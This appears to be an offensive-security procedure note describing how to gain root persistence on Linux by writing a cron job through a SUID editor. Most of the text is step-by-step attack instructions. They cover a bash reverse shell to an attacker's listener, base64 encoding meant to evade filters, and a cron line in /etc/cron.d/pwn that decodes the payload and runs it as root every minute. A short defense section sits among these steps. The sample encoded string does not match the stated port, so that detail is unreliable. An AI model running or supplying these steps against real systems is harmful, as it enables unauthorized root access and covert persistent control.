---
type: procedure
verified: true
submitted: true
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
techniques:
  - '[[Cron]]'
sub_techniques: []
tags:
  - persistence
commands:
  - '[[commands/bash-reverse-shell-connect]]'
  - '[[commands/base64-encode-string]]'
platforms:
  - Linux
tools: []
validated: true
---

# Schedule-Cron-Job-with-Root-Write-Privileges

## Summary

This procedure outlines how to create a cron job that executes a malicious payload with root privileges by leveraging write access to cron directories, such as through SUID-enabled editors like vim. It is commonly used for establishing persistence or escalating from code execution to a root shell in Linux environments where direct root file creation is restricted by ownership requirements.

## Description

In scenarios where an attacker has obtained write privileges as root via mechanisms like SUID binaries (e.g., vim with setuid root) or sudo access, they can abuse scheduled task mechanisms to run arbitrary code periodically. This technique targets the cron daemon, which executes jobs defined in /etc/cron.d/ every minute if scheduled with a wildcard. The payload is base64-encoded to bypass simple content filters and embedded in a cron entry that decodes and executes it via bash. This is particularly effective for persistence after initial compromise, as the job runs independently of the attacker's session. Note that new files in /etc/cron.d/ must be owned by root; if privileges like file capabilities prevent this, overwrite an existing cron job file instead. The procedure assumes vim is SUID root, but the steps adapt to other editors with similar privileges.

## Requirements

1. Write access to /etc/cron.d/ directory or existing cron files as root (e.g., via SUID vim: `ls -l /usr/bin/vim` shows `-rwsr-xr-x`).
2. Network connectivity from the target to the attacker's listener (for reverse shell payloads).
3. Base64 utility available (standard on Linux).
4. Attacker-controlled listener (e.g., netcat) on specified IP and port.

## Defense

- Monitor file modifications in /etc/cron.d/ and /etc/crontab using tools like auditd or file integrity monitoring (e.g., AIDE).
- Restrict SUID binaries on editors like vim with `find /usr/bin -perm -4000` and remove unnecessary setuid bits.
- Enable cron logging via /etc/rsyslog.conf and review for suspicious entries with base64 decoding or unusual bash invocations.
- Use immutable attributes on cron files with `chattr +i /etc/cron.d/*` to prevent modifications.
- Implement privilege separation and avoid granting sudo or SUID to common editors.

## Objectives

1. Establish persistence by scheduling a root-level payload execution every minute.
2. Achieve remote code execution as root via a reverse shell or similar payload.
3. Maintain access even after reboots or session termination.

## Instructions

### Step 1: Prepare the Reverse Shell Payload

**Context**: Select a simple bash reverse shell payload to connect back to the attacker's listener. This payload establishes an interactive shell over TCP.

**Command** ([[commands/bash-reverse-shell-connect]]):
```bash
bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1
```

> This command spawns an interactive bash shell and redirects input/output to a TCP connection. Replace $_TARGET_IP and $_TARGET_PORT with attacker details. Expected output on the listener: a connected shell prompt. Verify by testing the command manually if possible.

### Step 2: Base64 Encode the Payload

**Context**: Encode the payload to embed it safely in the cron job without breaking the syntax or triggering basic detection. This step produces a string that can be decoded at runtime.

**Command** ([[commands/base64-encode-string]]):
```bash
echo '$_PAYLOAD_STRING' | base64 -w 0
```

> Run this with the reverse shell command as $_PAYLOAD_STRING (e.g., 'bash -i >& /dev/tcp/10.10.10.10/4443 0>&1'). Expected output: A single line of base64-encoded text, such as `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMQ==`. Copy this for the next step.

### Step 3: Create the Cron Job Template

**Context**: Use an SUID-enabled editor like vim to write a cron job that decodes and executes the payload every minute. The format specifies root execution and includes the encoded payload.

**Code** ([[codes/cron-job-payload-decoder]]):
```cron
* * * * * root echo -n $_BASE64_ENCODED_PAYLOAD | base64 -d | bash
```

> Open vim with elevated privileges: `vim /etc/cron.d/pwn` (or overwrite an existing file like `vim /etc/cron.d/sysstat` if ownership issues arise). Paste the template, substituting $_BASE64_ENCODED_PAYLOAD with the output from Step 2. Save and exit (:wq). Expected: The file is created or updated in /etc/cron.d/ with root ownership. Verify with `ls -l /etc/cron.d/pwn` showing `-rw-r--r-- root root`.

### Step 4: Verify and Wait for Execution

**Context**: Confirm the cron job is active and monitor for payload execution. Cron runs jobs every minute based on the schedule.

**Instructions**: Check cron status with `crontab -l` or `cat /etc/cron.d/pwn`. Wait up to 60 seconds and monitor the attacker's listener for incoming connections.

> Expected output: No errors in cron logs (/var/log/cron), and a root shell connects to the listener. If no connection, check encoding, file permissions, and network firewall rules.

**Success Indicators**:
- Cron file contains the encoded payload and is owned by root.
- Listener receives a bash shell connection from the target IP.
